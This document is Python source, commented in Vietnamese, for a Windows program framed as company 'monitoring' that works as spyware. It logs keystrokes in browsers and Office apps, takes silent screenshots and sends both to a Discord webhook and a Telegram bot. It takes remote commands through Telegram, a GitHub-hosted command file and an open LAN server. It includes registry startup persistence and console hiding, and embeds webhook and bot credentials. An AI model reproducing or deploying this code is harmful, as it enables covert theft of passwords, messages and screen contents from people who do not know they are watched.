import psutil
import time
import requests
import json
import os
import socket
import platform
import logging
import re
import hashlib
import base64
import threading
import sys
import winreg
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from pathlib import Path
from pynput import keyboard
import win32gui
import win32process
import mss
from PIL import Image
from cryptography.fernet import Fernet

# ==================== CẤU HÌNH (đã bổ sung) ====================
CONFIG = {
    "discord_webhook": "https://discord.com/api/webhooks/1489246380999573665/mMBZkTa2fBi3Pji8YEvER1w7KxhKhbWY5-RT0Z4CZb75IupI5APUBsTvAA0xwVNAv4iI",
    "monitor_interval": 5,
    "log_dir": os.path.dirname(os.path.abspath(__file__)),  # Cùng thư mục với file code
    "log_password": "123456789",  # Mật khẩu bảo vệ log
    "max_log_size_mb": 100,
    "monitored_apps": ["winword.exe", "excel.exe", "powerpnt.exe", "chrome.exe", "firefox.exe", "msedge.exe", "notepad.exe"],
    "excluded_apps": ["oq", "fg", "jh"],
    "alert_unknown_apps": True,
    "monitor_usb": True,
    "company_name": "CÔNG TY CỦA BẠN",
    "enable_keylogging": True,
    "key_buffer_size": 500,
    
    # ====================== TÍNH NĂNG MỚI ======================
    "control_port": 6789,
    "relay_url": "",
    "relay_poll_interval": 2,

    # ── TELEGRAM BOT ──────────────────────────────────────────
    # Bước 1: Nhắn @BotFather → /newbot → copy token vào đây
    # Bước 2: Chạy get_telegram_id.py để lấy chat_id của bạn
    "telegram_token": "7751725882:AAECOg5Ve_FDq-OGtD05B_7rVeakO07HqSc",          # VD: "7123456789:AAFxxxxxxxxxxxxx"
    "telegram_allowed_ids": [7124717990],    # VD: [123456789] — để [] = ai cũng gửi được!
    # ──────────────────────────────────────────────────────────

    "screenshot_quality": 85,
    "screenshot_interval": 30,
    "max_screenshots_per_hour": 120,
}

# ==================== KHỞI TẠO ====================
# Hàm tạo khóa Fernet từ mật khẩu
def get_cipher_key(password):
    """Tạo khóa mã hóa từ mật khẩu"""
    import hashlib
    
    # Đơn giản hóa: dùng SHA256 + base64
    pwd_hash = hashlib.sha256(password.encode()).digest()
    key = base64.urlsafe_b64encode(pwd_hash)
    return key

# Tạo cipher từ mật khẩu
cipher = Fernet(get_cipher_key(CONFIG["log_password"]))

# Lớp để xử lý log được mã hóa
class EncryptedFileHandler(logging.FileHandler):
    def emit(self, record):
        try:
            msg = self.format(record)
            encrypted_msg = cipher.encrypt(msg.encode() + b'\n')
            
            # Ghi dưới dạng hex để có thể đọc được trong file
            with open(self.baseFilename, 'ab') as f:
                f.write(encrypted_msg + b'\n---ENCRYPTED_LOG_SEPARATOR---\n')
        except Exception:
            self.handleError(record)

log_file = os.path.join(CONFIG["log_dir"], f"{socket.gethostname()}_monitor.log")
keylog_file = os.path.join(CONFIG["log_dir"], f"{socket.gethostname()}_keylog.log")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        EncryptedFileHandler(log_file, encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

COMPUTER_NAME = socket.gethostname()
OS_NAME = platform.system() + " " + platform.release()

# Flag tắt từ xa
shutdown_flag = False
screenshot_mode = False  # chụp liên tục hay không



# ==================== HÀM CHỤP MÀN HÌNH (HOÀN TOÀN IM LẶNG) ====================
def take_screenshot():
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # màn hình chính
            screenshot = sct.grab(monitor)
            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
            
            # Nén ảnh
            temp_path = os.path.join(CONFIG["log_dir"], f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
            img.save(temp_path, quality=CONFIG["screenshot_quality"])
            
            caption = f"📸 {COMPUTER_NAME} — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

            # Gửi lên Discord
            with open(temp_path, "rb") as f:
                files = {"file": (os.path.basename(temp_path), f, "image/jpeg")}
                requests.post(CONFIG["discord_webhook"],
                              data={"content": f"**{caption}**"},
                              files=files, timeout=15)

            # Gửi lên Telegram
            tg_broadcast_photo(temp_path, caption)

            os.remove(temp_path)
            logger.info("Screenshot đã gửi thành công (Discord + Telegram)")
            return True
    except Exception as e:
        logger.error(f"Screenshot error: {e}")
        return False




# ==================== BỘ LỌC & CLEAN ====================
class SensitiveDataFilter:
    @classmethod
    def filter(cls, text):
        return text

def clean_content(content):
    content = content.replace('·', '')
    while '[BACKSPACE]' in content:
        idx = content.find('[BACKSPACE]')
        if idx > 0:
            content = content[:idx-1] + content[idx+len('[BACKSPACE]'):]
        else:
            content = content[len('[BACKSPACE]'):]
    while '[DELETE]' in content:
        idx = content.find('[DELETE]')
        if idx < len(content) - 1:
            content = content[:idx] + content[idx+1+len('[DELETE]'):]
        else:
            content = content[:idx]
    return content

# ==================== HÀM MỚI: TỰ ĐỘNG KHỞI ĐỘNG + ẨN + REMOTE ====================
def add_to_startup():
    """Thêm vào registry để tự chạy khi máy bật"""
    try:
        key = winreg.HKEY_CURRENT_USER
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE)
        
        script_path = os.path.abspath(__file__)
        # Ưu tiên pythonw.exe để chạy ngầm (không hiện console)
        python_exe = sys.executable.replace("python.exe", "pythonw.exe")
        if not os.path.exists(python_exe):
            python_exe = sys.executable
            
        cmd = f'"{python_exe}" "{script_path}"'
        winreg.SetValueEx(reg_key, "AGW_Monitor", 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(reg_key)
        
        logger.info("✅ Đã thêm vào Startup Registry")
        send_to_discord("🚀 Đã thiết lập **tự động chạy khi khởi động**", level="startup")
    except Exception as e:
        logger.warning(f"Không thêm được startup (có thể cần quyền admin): {e}")

def hide_console():
    """Ẩn cửa sổ console"""
    try:
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, 0)  # SW_HIDE
        logger.info("Console window đã bị ẩn")
    except:
        pass

def monitor_usb_thread():
    """Giám sát USB cắm vào máy"""
    previous_drives = set()
    while True:
        if not CONFIG["monitor_usb"]:
            time.sleep(60)
            continue
        try:
            current_drives = set()
            for partition in psutil.disk_partitions():
                if 'removable' in partition.opts.lower():
                    current_drives.add(partition.device)
            
            new_drives = current_drives - previous_drives
            for drive in new_drives:
                msg = f"🚨 **USB ĐƯỢC CẮM**: {drive} - Có thể chứa dữ liệu nhạy cảm!"
                send_to_discord(msg, level="alert")
                logger.warning(msg)
            
            previous_drives = current_drives.copy()
        except Exception as e:
            logger.debug(f"USB monitor error: {e}")
        time.sleep(5)

# ==================== CHECK COMMAND.TXT ====================
def check_command_status():
    """Kiểm tra nội dung hiện tại của command.txt từ GitHub (raw URL)"""
    try:
        print("\n" + "="*80)
        print("🔍 KIỂM TRA COMMAND.TXT HIỆN TẠI")
        print("="*80)
        
        raw_url = "https://raw.githubusercontent.com/keriaTH/detect_text/main/command.txt"
        resp = requests.get(raw_url, timeout=10)
        print(f"📌 Status: {resp.status_code}")
        
        if resp.status_code == 200:
            content = resp.text
            
            print(f"\n📝 Raw Content:")
            print(f"  '{content}'")
            
            print(f"\n🔤 After .strip().lower():")
            final = content.strip().lower()
            print(f"  '{final}'")
            
            print(f"\n✅ Valid Commands:")
            valid = ["shutdown", "screenshot", "screenshot_every_30s", "screenshot_stop", "status"]
            for cmd in valid:
                match = "✅ MATCH" if final == cmd else "❌"
                print(f"  {match} {cmd}")
        else:
            print(f"❌ Error: {resp.status_code}")
            print(f"Response: {resp.text[:200]}")
        
        print("="*80 + "\n")
        
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()

# ==================== EMBEDDED HTTP SERVER (nhận lệnh trực tiếp từ dashboard) ====================
def execute_command(cmd):
    """Thực thi lệnh nhận được từ dashboard"""
    global shutdown_flag, screenshot_mode
    cmd = cmd.strip().lower()
    logger.info(f"🔔 Nhận lệnh từ dashboard: '{cmd}'")

    if cmd == "shutdown":
        shutdown_flag = True
        send_to_discord("🛑 **LỆNH TẮT TỪ XA** đã nhận. Đang dừng...", level="alert")
        return {"status": "ok", "message": "Shutdown initiated"}

    elif cmd == "screenshot":
        screenshot_mode = False
        send_to_discord("📸 Đang chụp màn hình theo lệnh từ xa...", level="info")
        threading.Thread(target=take_screenshot, daemon=True).start()
        return {"status": "ok", "message": "Screenshot taken"}

    elif cmd == "screenshot_every_30s":
        screenshot_mode = True
        send_to_discord("📸 **Chế độ chụp liên tục** đã BẬT (mỗi 30 giây)", level="info")
        return {"status": "ok", "message": "Continuous screenshot ON"}

    elif cmd == "screenshot_stop":
        screenshot_mode = False
        send_to_discord("📸 Chế độ chụp liên tục đã TẮT", level="info")
        return {"status": "ok", "message": "Continuous screenshot OFF"}

    elif cmd == "status":
        msg = f"💓 **STATUS**: Đang chạy - Screenshot mode: {'ON' if screenshot_mode else 'OFF'}"
        send_to_discord(msg, level="info")
        return {
            "status": "ok",
            "message": "Status sent to Discord",
            "screenshot_mode": screenshot_mode,
            "shutdown_flag": shutdown_flag,
            "computer": COMPUTER_NAME,
            "os": OS_NAME,
        }

    else:
        logger.debug(f"Unknown command: '{cmd}'")
        return {"status": "error", "message": f"Unknown command: '{cmd}'"}


class DashboardHandler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')

    def send_json(self, data, code=200):
        body = json.dumps(data, ensure_ascii=False).encode('utf-8')
        self.send_response(code)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Content-Length', len(body))
        self._cors()
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(200)
        self._cors()
        self.end_headers()

    def do_GET(self):
        if self.path == '/status':
            self.send_json({
                "online": True,
                "computer": COMPUTER_NAME,
                "os": OS_NAME,
                "screenshot_mode": screenshot_mode,
                "shutdown_flag": shutdown_flag,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
        else:
            self.send_json({"error": "Not found"}, 404)

    def do_POST(self):
        if self.path == '/command':
            length = int(self.headers.get('Content-Length', 0))
            raw = self.rfile.read(length)
            try:
                data = json.loads(raw.decode('utf-8'))
                cmd = str(data.get('command', '')).strip()
            except Exception:
                self.send_json({"status": "error", "message": "Invalid JSON"}, 400)
                return
            result = execute_command(cmd)
            self.send_json(result)
        else:
            self.send_json({"error": "Not found"}, 404)

    def log_message(self, format, *args):
        pass  # tắt log mặc định


# ==================== TELEGRAM BOT ====================
def tg_send(token, chat_id, text):
    """Gửi tin nhắn văn bản qua Telegram"""
    try:
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"},
            timeout=10
        )
    except Exception as e:
        logger.debug(f"Telegram send error: {e}")

def tg_send_photo(token, chat_id, photo_path, caption=""):
    """Gửi ảnh qua Telegram"""
    try:
        with open(photo_path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{token}/sendPhoto",
                data={"chat_id": chat_id, "caption": caption},
                files={"photo": f},
                timeout=20
            )
    except Exception as e:
        logger.debug(f"Telegram send photo error: {e}")

def tg_broadcast(text):
    """Gửi tin nhắn đến tất cả chat_id trong telegram_allowed_ids"""
    token = CONFIG.get("telegram_token", "").strip()
    ids   = CONFIG.get("telegram_allowed_ids", [])
    if not token or not ids:
        return
    for cid in ids:
        tg_send(token, cid, text)

def tg_broadcast_photo(photo_path, caption=""):
    """Gửi ảnh đến tất cả chat_id trong telegram_allowed_ids"""
    token = CONFIG.get("telegram_token", "").strip()
    ids   = CONFIG.get("telegram_allowed_ids", [])
    if not token or not ids:
        return
    for cid in ids:
        tg_send_photo(token, cid, photo_path, caption)


def take_screenshot_telegram(token, chat_id):
    """Chụp màn hình và gửi thẳng về Telegram"""
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            shot = sct.grab(monitor)
            img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
            temp = os.path.join(CONFIG["log_dir"], f"tg_shot_{datetime.now().strftime('%H%M%S')}.jpg")
            img.save(temp, quality=CONFIG["screenshot_quality"])

        tg_send_photo(token, chat_id, temp,
                      caption=f"📸 {COMPUTER_NAME} — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        os.remove(temp)
    except Exception as e:
        tg_send(token, chat_id, f"❌ Lỗi chụp màn hình: {e}")

def telegram_thread():
    """Long-polling Telegram để nhận lệnh điều khiển từ xa"""
    global shutdown_flag, screenshot_mode

    token = CONFIG.get("telegram_token", "").strip()
    if not token:
        logger.info("Telegram token chưa cấu hình, bỏ qua.")
        return

    allowed = CONFIG.get("telegram_allowed_ids", [])
    offset = 0
    TG = f"https://api.telegram.org/bot{token}"

    HELP = (
        "🎮 *AGW Remote Control*\n"
        f"🖥 Máy: `{COMPUTER_NAME}`\n\n"
        "Lệnh:\n"
        "/status — Trạng thái hiện tại\n"
        "/screenshot — Chụp màn hình ngay\n"
        "/screenshot\\_start — Chụp mỗi 30 giây\n"
        "/screenshot\\_stop — Dừng chụp\n"
        "/shutdown — Tắt chương trình\n"
        "/help — Xem lại danh sách lệnh"
    )

    logger.info(f"✅ Telegram bot đang chạy (token: ...{token[-6:]})")

    # Thông báo khởi động
    try:
        me = requests.get(f"{TG}/getMe", timeout=10).json()
        bot_name = me.get("result", {}).get("username", "bot")
        logger.info(f"   Bot username: @{bot_name}")
    except Exception:
        pass

    while True:
        try:
            resp = requests.get(
                f"{TG}/getUpdates",
                params={"offset": offset, "timeout": 30, "allowed_updates": ["message"]},
                timeout=35
            )
            updates = resp.json().get("result", [])
        except Exception as e:
            logger.debug(f"Telegram poll error: {e}")
            time.sleep(5)
            continue

        for upd in updates:
            offset = upd["update_id"] + 1
            msg = upd.get("message", {})
            chat_id = msg.get("chat", {}).get("id")
            text = msg.get("text", "").strip()

            if not chat_id or not text:
                continue

            # Kiểm tra quyền
            if allowed and chat_id not in allowed:
                tg_send(token, chat_id,
                        f"⛔ Bạn không có quyền điều khiển.\nChat ID của bạn: `{chat_id}`")
                logger.warning(f"Telegram: từ chối chat_id={chat_id}")
                continue

            logger.info(f"Telegram lệnh từ {chat_id}: '{text}'")
            cmd = text.lower().lstrip("/").replace(" ", "_")

            # ── Xử lý lệnh ──────────────────────────────
            if cmd in ("help", "start"):
                tg_send(token, chat_id, HELP)

            elif cmd == "status":
                tg_send(token, chat_id,
                    f"💓 *Trạng thái*\n"
                    f"🖥 Máy: `{COMPUTER_NAME}`\n"
                    f"🪟 OS: `{OS_NAME}`\n"
                    f"📸 Screenshot liên tục: `{'ON' if screenshot_mode else 'OFF'}`\n"
                    f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )

            elif cmd == "screenshot":
                tg_send(token, chat_id, "📸 Đang chụp màn hình...")
                threading.Thread(
                    target=take_screenshot_telegram,
                    args=(token, chat_id),
                    daemon=True
                ).start()

            elif cmd == "screenshot_start":
                screenshot_mode = True
                tg_send(token, chat_id, "🎥 Chế độ chụp liên tục đã *BẬT* (mỗi 30 giây)")

            elif cmd == "screenshot_stop":
                screenshot_mode = False
                tg_send(token, chat_id, "⏹ Chế độ chụp liên tục đã *TẮT*")

            elif cmd == "shutdown":
                tg_send(token, chat_id, "🛑 Đang tắt chương trình trên máy đích...")
                shutdown_flag = True

            else:
                tg_send(token, chat_id,
                        f"❓ Lệnh `{text}` không hợp lệ.\nGõ /help để xem danh sách lệnh.")


def start_control_server():
    """Khởi động HTTP server nhận lệnh trực tiếp (chế độ LAN)"""
    port = CONFIG["control_port"]
    try:
        server = HTTPServer(('0.0.0.0', port), DashboardHandler)
        logger.info(f"✅ LAN control server: http://localhost:{port}")
        server.serve_forever()
    except Exception as e:
        logger.error(f"Control server lỗi: {e}")


def relay_poll_thread():
    """Poll relay server để nhận lệnh từ xa (chế độ internet).
    hi.py tự kết nối ra ngoài → bypass NAT/firewall hoàn toàn."""
    relay = CONFIG.get("relay_url", "").rstrip("/")
    if not relay:
        logger.info("Relay URL không được cấu hình, bỏ qua chế độ remote.")
        return

    logger.info(f"✅ Remote mode: đang poll relay {relay} mỗi {CONFIG['relay_poll_interval']}s")
    send_to_discord(f"🌐 **Remote mode**: đang kết nối relay `{relay}`", level="startup")

    prev_cmd = None
    headers = {"Cache-Control": "no-cache", "Pragma": "no-cache"}

    while True:
        try:
            # hi.py GET lệnh từ relay (kết nối chiều ra, không cần mở port)
            resp = requests.get(f"{relay}/command.txt", headers=headers, timeout=8)
            if resp.status_code == 200:
                cmd = resp.text.strip().lower()
                if cmd and cmd != prev_cmd:
                    logger.info(f"🔔 Lệnh từ relay: '{cmd}'")
                    execute_command(cmd)
                    prev_cmd = cmd
                    # Báo relay đã nhận để relay reset lệnh
                    try:
                        requests.post(f"{relay}/api/ack", json={"acked": cmd}, timeout=5)
                    except Exception:
                        pass
                elif not cmd:
                    prev_cmd = None  # reset khi relay bị xóa lệnh
        except Exception as e:
            logger.debug(f"Relay poll error: {e}")

        time.sleep(CONFIG["relay_poll_interval"])

# ==================== CHỤP LIÊN TỤC (nếu bật) ====================
def continuous_screenshot_thread():
    global screenshot_mode
    count = 0
    while True:
        if screenshot_mode:
            take_screenshot()
            count += 1
            if count >= CONFIG["max_screenshots_per_hour"]:
                screenshot_mode = False
                send_to_discord("⚠️ Đã đạt giới hạn screenshot/giờ, tự động tắt chế độ liên tục", level="warning")
        time.sleep(CONFIG["screenshot_interval"])

# ==================== CÁC HÀM CŨ (giữ nguyên + tối ưu nhẹ) ====================
def send_to_discord(message, level="info"):
    emoji = {"info": "ℹ️", "warning": "⚠️", "alert": "🚨", "startup": "🟢", "shutdown": "⛔"}.get(level, "📌")
    full_msg = f"{emoji} *[{COMPUTER_NAME}]* {message}"

    # Gửi Discord
    if CONFIG["discord_webhook"] and "YOUR_WEBHOOK" not in CONFIG["discord_webhook"]:
        try:
            requests.post(CONFIG["discord_webhook"], json={
                "content": full_msg.replace("*", "**"),
                "username": f"Giám sát {CONFIG['company_name']}"
            }, timeout=10)
        except:
            pass

    # Gửi Telegram (cùng nội dung)
    tg_broadcast(full_msg)

def get_active_window_info():
    try:
        hwnd = win32gui.GetForegroundWindow()
        window_title = win32gui.GetWindowText(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        app_name = psutil.Process(pid).name().lower() if pid else "unknown"
        return {"title": window_title[:200], "app": app_name, "pid": pid}
    except:
        return None

def should_log_key():
    if not CONFIG["enable_keylogging"]:
        return False
    window_info = get_active_window_info()
    if not window_info:
        return False
    app = window_info["app"]
    if any(ex in app for ex in CONFIG["excluded_apps"]):
        return False
    if CONFIG["monitored_apps"] and app not in CONFIG["monitored_apps"]:
        return False
    return True

# ==================== KEYLOGGER (giữ nguyên + ổn định) ====================
class SmartKeylogger:
    def __init__(self):
        self.key_buffer = []
        self.buffer_lock = threading.Lock()
        self.flush_interval = 30
        self.listener = None

    def on_press(self, key):
        if not should_log_key():
            return
        try:
            if hasattr(key, 'char') and key.char is not None:
                key_char = key.char
            else:
                special_map = {
                    keyboard.Key.space: ' ', keyboard.Key.enter: '\n', keyboard.Key.tab: '\t',
                    keyboard.Key.backspace: '[BACKSPACE]', keyboard.Key.delete: '[DELETE]',
                    keyboard.Key.up: '[↑]', keyboard.Key.down: '[↓]',
                    keyboard.Key.left: '[←]', keyboard.Key.right: '[→]',
                }
                key_char = special_map.get(key, f'[{key.name.upper()}]')
            
            with self.buffer_lock:
                self.key_buffer.append(key_char)
        except:
            pass

    def flush(self):
        with self.buffer_lock:
            if not self.key_buffer:
                return
            content = ''.join(self.key_buffer)
            self.key_buffer.clear()
        
        content = clean_content(content)
        if not content.strip():
            return

        window_info = get_active_window_info()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        log_entry = {
            "timestamp": timestamp,
            "computer": COMPUTER_NAME,
            "app": window_info["app"] if window_info else "unknown",
            "window_title": window_info["title"] if window_info else "",
            "content": content,
            "length": len(content)
        }
        
        # Mã hóa nội dung keylog
        log_json = json.dumps(log_entry, ensure_ascii=False) + '\n'
        encrypted_log = cipher.encrypt(log_json.encode())
        
        with open(keylog_file, 'ab') as f:
            f.write(encrypted_log + b'\n---ENCRYPTED_LOG_SEPARATOR---\n')
        
        self.send_to_discord(window_info, content, timestamp)

    def send_to_discord(self, window_info, content, timestamp):
        app_name     = window_info["app"]   if window_info else "unknown"
        window_title = window_info["title"] if window_info else ""

        cleaned = ' '.join(content.replace('\n', ' ').replace('\r', ' ').split())
        chunks  = [cleaned[i:i+1900] for i in range(0, len(cleaned), 1900)]

        for i, chunk in enumerate(chunks):
            # ── Discord (embed) ──
            if CONFIG["discord_webhook"] and "YOUR_WEBHOOK" not in CONFIG["discord_webhook"]:
                embed = {
                    "title": "⌨️ BÁO CÁO HOẠT ĐỘNG NHẬP LIỆU",
                    "color": 3447003,
                    "fields": [
                        {"name": "🕐 Thời Gian",   "value": timestamp,              "inline": True},
                        {"name": "📱 Ứng Dụng",    "value": f"`{app_name}`",        "inline": True},
                        {"name": "🪟 Tiêu Đề",     "value": window_title[:250] or "N/A", "inline": False},
                        {"name": f"📝 Nội Dung ({i+1}/{len(chunks)})", "value": chunk, "inline": False},
                        {"name": "📊 Thống Kê",    "value": f"{len(content)} ký tự", "inline": True}
                    ]
                }
                try:
                    requests.post(CONFIG["discord_webhook"],
                                  json={"embeds": [embed], "username": f"Bot Giám Sát - {CONFIG['company_name']}"},
                                  timeout=10)
                except:
                    pass

            # ── Telegram (text) ──
            tg_msg = (
                f"⌨️ *Keylog* — `{app_name}`\n"
                f"🕐 {timestamp}\n"
                f"🪟 {window_title[:100] or 'N/A'}\n"
                f"📝 `{chunk[:3000]}`"
            )
            tg_broadcast(tg_msg)

    def start(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        def periodic_flush():
            while True:
                time.sleep(self.flush_interval)
                self.flush()
        threading.Thread(target=periodic_flush, daemon=True).start()
        logger.info("Keylogger started")
        send_to_discord("⌨️ **Giám sát nhập liệu khởi động**", level="startup")

    def stop(self):
        if self.listener:
            self.flush()
            self.listener.stop()
        logger.info("Keylogger stopped")

# ==================== BANNER & MAIN ====================
def print_startup_banner():
    banner = f"""
    ╔══════════════════════════════════════════════════════════════════╗
    ║                    HỆ THỐNG GIÁM SÁT AGW v2                     ║
    ╠══════════════════════════════════════════════════════════════════╣
    ║  Công ty : {CONFIG['company_name']:<48} ║
    ║  Máy     : {COMPUTER_NAME:<48} ║
    ║  OS      : {OS_NAME:<48} ║
    ║  Start   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<48} ║
    ╚══════════════════════════════════════════════════════════════════╝
    """
    print(banner)
    logger.info("STARTING MONITORING SYSTEM v2")
    send_to_discord("🚀 **Hệ thống giám sát phiên bản 2 đã khởi động**", level="startup")

def main():
    global shutdown_flag
    print_startup_banner()
    
    # add_to_startup()
    # hide_console()

    # Chế độ LAN: embedded HTTP server (dashboard kết nối thẳng)
    threading.Thread(target=start_control_server, daemon=True).start()
    logger.info(f"LAN control server: http://localhost:{CONFIG['control_port']}")

    # Chế độ Remote: poll relay server qua internet
    threading.Thread(target=relay_poll_thread, daemon=True).start()

    # Telegram Bot: nhận lệnh qua Telegram (không cần server, không cần mở port)
    threading.Thread(target=telegram_thread, daemon=True).start()
    
    # # Khởi động USB monitor
    # if CONFIG["monitor_usb"]:
    #     threading.Thread(target=monitor_usb_thread, daemon=True).start()
    #     logger.info("USB monitoring started")

    threading.Thread(target=continuous_screenshot_thread, daemon=True).start()
    # Khởi động keylogger
    keylogger = SmartKeylogger()
    keylogger.start()
    
    cycle_count = 0
    try:
        while True:
            cycle_count += 1
            if cycle_count % 30 == 0:
                send_to_discord(f"💓 **Heartbeat** - Cycle {cycle_count} - Đang hoạt động bình thường", level="info")
            
            if shutdown_flag:
                keylogger.stop()
                logger.info("=== MONITORING STOPPED BY REMOTE COMMAND ===")
                send_to_discord("🛑 **Hệ thống đã dừng theo lệnh từ xa**", level="shutdown")
                break
            
            time.sleep(CONFIG["monitor_interval"])
            
    except KeyboardInterrupt:
        keylogger.stop()
        logger.info("=== MONITORING STOPPED MANUALLY ===")
        send_to_discord("🛑 **Hệ thống giám sát dừng lại**", level="shutdown")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        send_to_discord(f"❌ Lỗi bất ngờ: {e}", level="alert")

if __name__ == "__main__":
    main()
